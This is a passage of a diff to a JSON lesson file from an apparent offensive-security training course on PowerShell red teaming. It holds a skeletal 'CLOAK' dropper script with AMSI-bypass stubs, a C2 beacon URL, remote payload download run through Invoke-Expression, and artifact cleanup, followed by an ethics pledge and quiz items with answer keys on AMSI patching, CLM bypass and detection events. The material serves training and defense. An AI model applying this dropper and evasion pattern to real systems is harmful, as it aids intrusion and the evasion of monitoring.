**File-based**: Monitor for kill file\n4. **Environmental**: Stop if unexpected changes detected (new logging, AV)\n5. **White cell override**: Command from engagement managers\n\n**Putting It All Together: CLOAK Framework**\n\n```powershell\n<#\n.SYNOPSIS\n    Red team PowerShell dropper using CLOAK methodology\n.DESCRIPTION\n    Modular, resilient, ethical red team tool\n.NOTES\n    For authorized penetration testing only\n#>\n\n# ===== C - Compartmentalize =====\nfunction Test-DefensivePosture {\n    # Recon module\n    $posture = @{}\n    $posture.AMSI = Test-AMSI\n    $posture.CLM = Test-ConstrainedLanguageMode\n    $posture.Logging = Test-PowerShellLogging\n    return $posture\n}\n\nfunction Invoke-AMSIBypass {\n    # Bypass module\n    # [Implementation]\n}\n\nfunction Get-Payload {\n    # Payload delivery module\n    # [Implementation]\n}\n\nfunction Remove-Artifacts {\n    # Cleanup module\n    # [Implementation]\n}\n\n# ===== L - Living-off-the-Land =====\n$wc = New-Object Net.WebClient  # Built-in .NET\n# Instead of custom wget.exe\n\n# ===== O - Observe Telemetry =====\nfunction Watch-Telemetry {\n    # Monitor what we're generating\n    Get-WinEvent -LogName \"Microsoft-Windows-PowerShell/Operational\" -MaxEvents 10\n}\n\n# ===== A - Automate Checks =====\n$preflight = Test-DefensivePosture\nif ($preflight.Logging.ScriptBlockLogging) {\n    Write-Warning \"Script Block Logging active - adjusting approach\"\n    # Use alternate technique\n}\n\n# ===== K - Kill Switches =====\n$killSwitches = @{\n    Timeout = 60  # minutes\n    BeaconUrl = \"http://C2/status\"\n    KillFile = \"C:\\\\Temp\\\\STOP\"\n}\n\n# ===== Main Execution with CLOAK =====\nfunction Invoke-CLOAKOperation {\n    # 1. Compartmentalized check\n    $posture = Test-DefensivePosture\n    \n    # 2. Living-off-the-Land execution\n    if ($posture.AMSI -eq \"ACTIVE\") {\n        Invoke-AMSIBypass\n    }\n    \n    # 3. Observe what we're doing\n    Watch-Telemetry\n    \n    # 4. Automated decision\n    if ($posture.Logging.Transcription) {\n        # Too risky - abort or pivot\n        return\n    }\n    \n    # 5. Execute with kill switches\n    Invoke-WithKillSwitches -Payload {\n        $payload = Get-Payload\n        Invoke-Expression $payload\n    } -TimeoutMinutes 30\n    \n    # 6. Cleanup\n    Remove-Artifacts\n}\n\n# Execute\nInvoke-CLOAKOperation\n```\n\n**CLOAK Benefits:**\n\n1. **Modularity**: Easy to test and modify\n2. **Resilience**: Multiple fallback options\n3. **Safety**: Kill switches prevent runaway operations\n4. **Ethics**: Built-in guardrails and coordination\n5. **Reusability**: Components work across engagements\n6. **Professionalism**: Demonstrates mature tradecraft\n\n**Key Takeaway:**\n\nCLOAK isn't just a technique - it's a mindset. Professional red teamers engineer their tools with the same rigor as software developers, because lives and businesses depend on responsible security testing."
+      },
+      "simplified_explanation": "CLOAK framework: Compartmentalize (modular), Living-off-the-Land (use built-ins), Observe (monitor telemetry), Automate (verify assumptions), Kill switches (safety). This structured approach ensures resilient, ethical red teaming.",
+      "memory_aids": [
+        "CLOAK = Professional Red Teaming",
+        "Compartmentalize → Modular components",
+        "Living-off-the-Land → Built-in tools",
+        "Observe → Know your telemetry",
+        "Automate → Check everything",
+        "Kill Switches → Safety first"
+      ],
+      "real_world_connection": "Top tier red teams (Google Red Team, Microsoft Detection team, Mandiant) all use similar frameworks. CLOAK synthesizes best practices from real engagements.",
+      "reflection_prompt": "How would implementing CLOAK change your current approach to red team tool development?",
+      "is_interactive": false,
+      "xp_reward": 20
+    },
+    {
+      "block_id": "final-reflection",
+      "type": "reflection",
+      "title": "Integration and Commitment",
+      "content": {
+        "text": "## Solidify Your Offensive PowerShell Mastery\n\n**Reflection Exercise: Teach Both Sides**\n\nThe ultimate test of understanding offensive techniques is explaining them from both perspectives.\n\n**Your Challenge:**\n\nPrepare a 10-minute presentation that covers:\n\n1. **One AMSI bypass technique**\n   - How it works (offensive perspective)\n   - How to detect it (defensive perspective)\n   - Sample code and telemetry\n\n2. **One real-world case study**\n   - What the attacker did\n   - How they got caught\n   - Lessons for both red and blue teams\n\n3. **Your lab results**\n   - Technique you tested\n   - Telemetry generated\n   - Detection recommendations\n\n**Present to:**\n- A colleague (bonus: from blue team)\n- Your study group\n- Or record yourself and self-critique\n\n**Personal Commitment:**\n\nAnswer this question:\n\n*\"In my next authorized penetration test, I will implement [SPECIFIC TECHNIQUE] with [SPECIFIC GUARDRAIL] to improve [SPECIFIC DEFENSE]. I will know I succeeded when [MEASURABLE OUTCOME].\"*\n\n**Example:**\n\"In my next authorized penetration test, I will implement AMSI memory patching with time-based kill switches to help the blue team improve their ETW monitoring. I will know I succeeded when the detection team identifies the bypass within 4 hours and creates a working detection rule.\"\n\n**Your Answer:**\n_________________________________\n_________________________________\n_________________________________\n\n**30-Day Follow-Up:**\n\nSet calendar reminders:\n- **Day 7**: Review your lab notes and practice one technique\n- **Day 14**: Read about a new AMSI bypass or CLM evasion\n- **Day 21**: Build a new detection rule for a technique you learned\n- **Day 30**: Complete a full red team exercise using CLOAK framework\n\n**Ethical Commitment:**\n\nSign this personal agreement:\n\n```\nI understand that the techniques in this lesson are powerful and potentially\ndangerous. I commit to:\n\n1. Only use these techniques with explicit written authorization\n2. Implement safety mechanisms (kill switches, monitoring)\n3. Coordinate with engagement managers and white cell\n4. Document all actions for defensive improvement\n5. Share knowledge responsibly to improve security\n6. Never exceed authorized scope\n7. Prioritize improving defenses over demonstrating skill\n\nSigned: _________________  Date: _________\n```\n\n**The Meta-Learning Principle:**\n\nYou didn't just learn PowerShell offensive techniques today. You learned:\n\n1. **How attackers think** - So you can anticipate them\n2. **How defenders detect** - So you can test their coverage\n3. **How to balance offense and defense** - The purple team mindset\n4. **How to operate ethically** - The professional standard\n5. **How to improve continuously** - Both sides evolve\n\nThese meta-skills apply to any security discipline.\n\n**Remember:**\n\nThe best red teamers are measured not by how many systems they compromise, but by how much they improve defensive capabilities. You're not here to break things - you're here to make them stronger.\n\n**Your mission**: Use your knowledge to make organizations more secure, one engagement at a time.\n\n**Welcome to professional offensive security. Use your powers wisely.**"
+      },
+      "simplified_explanation": "Teach these techniques from both offensive and defensive perspectives. Make a personal commitment to ethical use. Remember: your goal is improving defenses, not just bypassing them.",
+      "memory_aids": [
+        "Teach both sides = True mastery",
+        "Commit to ethics",
+        "Improve > Break",
+        "Purple team mindset",
+        "Knowledge requires responsibility"
+      ],
+      "real_world_connection": "Professional red teamers are hired to improve defenses, not damage systems. Companies pay top dollar for ethical hackers who help them get better, not worse.",
+      "reflection_prompt": "How will you ensure your offensive security work always contributes to better defenses?",
+      "is_interactive": true,
+      "xp_reward": 15
     }
   ],
   "pre_assessment": null,
   "post_assessment": [
     {
-      "question_id": "3b067136-b75b-41d3-af5a-78bd8dc0266b",
+      "question_id": "q1",
       "type": "multiple_choice",
-      "question": "During staging you discover Constrained Language Mode is enforced and script block logging is enabled. What is the first action in the AMSI bypass decision tree outlined in this lesson?",
+      "question": "What is the primary reason AMSI can be bypassed through memory patching?",
       "options": [
-        "Immediately patch `AmsiScanBuffer` in memory",
-        "Attempt to disable CLM via registry edits",
-        "Assess telemetry state and capture it in your runbook before escalating",
-        "Switch to a custom unmanaged implant immediately"
+        "AMSI runs in kernel mode and has bugs",
+        "AMSI runs in user mode in the same process as the script, allowing direct memory modification",
+        "Windows Defender doesn't scan PowerShell scripts",
+        "AMSI only checks file-based scripts, not in-memory execution"
       ],
-      "correct_answer": 2,
-      "explanation": "The decision tree starts with sensing and documenting current controls to justify later escalation and maintain white cell trust.",
+      "correct_answer": 1,
+      "explanation": "AMSI runs in user mode within the same process as PowerShell. This means code running in that process can modify AMSI's memory (like patching AmsiScanBuffer) if it can change memory protections with VirtualProtect. This is why AMSI is not a perfect security boundary.",
       "difficulty": 3,
-      "memory_aid": "Sense → Patch → Proxy → Pivot",
-      "points": 12
+      "memory_aid": "User mode = Same process = Patchable memory",
+      "points": 15
     },
     {
-      "question_id": "293d224a-b952-4ded-a0ea-5f45525d1f53",
+      "question_id": "q2",
       "type": "multiple_choice",
-      "question": "Which principle from the CLOAK blueprint keeps your PowerShell automation safest during long engagements?",
+      "question": "When encountering Constrained Language Mode (CLM), which bypass technique relies on executing trusted Microsoft binaries?",
       "options": [
-        "Using custom binaries for every task",
-        "Documenting nothing to stay stealthy",
-        "Automating AMSI and CLM checks before payload execution",
-        "Avoiding kill switches to reduce code paths"
+        "PowerShell v2 downgrade",
+        "AMSI memory patching",
+        "Using LOLBins like MSBuild.exe or InstallUtil.exe",
+        "COM object instantiation"
       ],
       "correct_answer": 2,
-      "explanation": "CLOAK emphasises automated guardrails and telemetry checks before executing offensive payloads, reducing surprise detections.",
+      "explanation": "LOLBins (Living-off-the-Land Binaries) like MSBuild.exe and InstallUtil.exe are signed Microsoft binaries that can execute code. When they host PowerShell runspaces or execute C# code, that code runs in FullLanguage mode, bypassing CLM restrictions.",
       "difficulty": 3,
-      "memory_aid": "CLOAK",
-      "points": 12
+      "memory_aid": "LOLBins = Trusted Microsoft binaries = CLM bypass",
+      "points": 15
     },
     {
-      "question_id": "634c1793-a2cc-4bf6-829f-415cf2373e02",
+      "question_id": "q3",
       "type": "multiple_choice",
-      "question": "Why do elite operators schedule teach-back sessions with defenders after building new PowerShell tooling?",
+      "question": "Which PowerShell logging feature captures deobfuscated script content, making it most valuable for detecting obfuscated attacks?",
       "options": [
-        "It forces incident response teams to reveal detection gaps and strengthens trust",
-        "It slows operations and hides failures",
-        "It ensures defenders never see payloads",
-        "It eliminates the need for engagement scopes"
+        "Module Logging",
+        "Transcription",
+        "Script Block Logging (Event ID 4104)",
+        "Process Auditing"
       ],
-      "correct_answer": 0,
-      "explanation": "Teach-backs align red and blue teams, revealing blind spots while reinforcing ethical guardrails and communication channels.",
+      "correct_answer": 2,
+      "explanation": "Script Block Logging (Event ID 4104) captures PowerShell script blocks AS THEY EXECUTE, including deobfuscated content. Even if an attacker uses heavy obfuscation, the final executed code is logged in readable form. This makes it the most powerful logging mechanism for detecting obfuscated PowerShell attacks.",
       "difficulty": 3,
-      "memory_aid": "Teach → Refine → Repeat",
-      "points": 12
+      "memory_aid": "Event 4104 = Deobfuscated code = See everything",
+      "points": 15
+    },
+    {
+      "question_id": "q4",
+      "type": "multiple_choice",
+      "question": "In the CLOAK methodology, what does the 'K' stand for and why is it critical?",
+      "options": [
+        "Kerberos authentication for secure C2",
+        "Kill switches - automated safety mechanisms that stop operations",
+        "Kernel-mode rootkits for persistence",
+        "Knowledge sharing with other red teams"
+      ],
+      "correct_answer": 1,
+      "explanation": "K stands for Kill Switches - automated mechanisms (time-based, beacon-based, file-based) that stop red team operations. This is critical for ethical engagements because it prevents runaway operations, ensures scope compliance, and provides white cell override capability. Professional red teams never operate without kill switches.",
+      "difficulty": 3,
+      "memory_aid": "CLOAK K = Kill Switches = Safety first",
+      "points": 15
+    },
+    {
+      "question_id": "q5",
+      "type": "multiple_choice",
+      "question": "What is the primary defensive advantage of implementing Constrained Language Mode?",
+      "options": [
+        "It completely prevents PowerShell execution",
+        "It blocks access to dangerous .NET APIs, limiting attacker capabilities even after code execution",
+        "It encrypts all PowerShell scripts automatically",
+        "It requires admin privileges for all PowerShell commands"
+      ],
+      "correct_answer": 1,
+      "explanation": "CLM restricts access to dangerous .NET APIs like Add-Type, Reflection, and COM instantiation. Even if an attacker achieves code execution, they can't use these powerful features to escalate privileges or execute advanced attacks. This forces attackers to use LOLBins or accept limited functionality, making defense easier.",
+      "difficulty": 3,
+      "memory_aid": "CLM = Limited .NET access = Reduced attack surface",
+      "points": 15
+    },
+    {
+      "question_id": "q6",
+      "type": "multiple_choice",
+      "question": "Which Sysmon Event ID is most useful for detecting reflective DLL injection and process injection techniques?",
+      "options": [
+        "Event ID 1 - Process Creation",
+        "Event ID 3 - Network Connection",
+        "Event ID 7 - Image Loaded",
+        "Event ID 8 - CreateRemoteThread"
+      ],
+      "correct_answer": 3,
+      "explanation": "Sysmon Event ID 8 (CreateRemoteThread) detects when a process creates a thread in another process's memory space - a key indicator of process injection and reflective DLL injection. This is one of the most important events for detecting in-memory malware techniques.",
+      "difficulty": 3,
+      "memory_aid": "Sysmon Event 8 = CreateRemoteThread = Process injection",
+      "points": 15
+    },
+    {
+      "question_id": "q7",
+      "type": "multiple_choice",
+      "question": "From an OpSec perspective, why is it critical to test your offensive techniques in a lab with full logging enabled BEFORE using them in an engagement?",
+      "options": [
+        "To practice your typing speed",
+        "To understand what telemetry you generate and adjust techniques to minimize detection",
+        "Because labs are faster than production environments",
+        "To avoid legal liability"
+      ],
+      "correct_answer": 1,
+      "explanation": "Testing with full logging reveals what telemetry your techniques generate (Script Block Logs, Sysmon events, network traffic, etc.). This allows you to adjust your OpSec, choose stealthier techniques, or accept detection risk with eyes open. Professional red teamers spend more time analyzing their own telemetry than executing attacks.",
+      "difficulty": 3,
+      "memory_aid": "Lab with logging = Know your footprint = Better OpSec",
+      "points": 15
+    },
+    {
+      "question_id": "q8",
+      "type": "multiple_choice",
+      "question": "What is the most important principle when conducting offensive security operations?",
+      "options": [
+        "Always use the latest zero-day exploits",
+        "Never get detected under any circumstances",
+        "Only operate within authorized scope with proper guardrails and safety mechanisms",
+        "Maximize the number of systems compromised"
+      ],
+      "correct_answer": 2,
+      "explanation": "The most important principle is operating ethically within authorized scope with proper safety mechanisms (kill switches, white cell coordination, documentation). Red teaming exists to improve defenses, not to break things. Exceeding scope or operating without guardrails is unethical and potentially criminal, regardless of technical skill.",
+      "difficulty": 3,
+      "memory_aid": "Ethics > Skill, Authorization > Everything",
+      "points": 15
     }
   ],
   "mastery_threshold": 85,
   "jim_kwik_principles": [
-    "active_learning",
-    "minimum_effective_dose",
     "teach_like_im_10",
     "memory_hooks",
-    "meta_learning",
     "connect_to_what_i_know",
+    "active_learning",
+    "meta_learning",
+    "minimum_effective_dose",
     "reframe_limiting_beliefs",
     "gamify_it",
     "learning_sprint",
     "multiple_memory_pathways"
   ],
-  "base_xp_reward": 160,
+  "base_xp_reward": 250,
   "badge_unlock": null,
   "is_core_concept": false,
-  "created_at": "2025-10-28T17:05:00",
-  "updated_at": "2025-10-28T17:05:00",
+  "created_at": "2025-11-06T14:00:00",
+  "updated_at": "2025-11-06T14:00:00",
   "author": "CyberLearn Advanced Curriculum Team",
-  "version": "2.1"
+  "version": "3.0"
 }
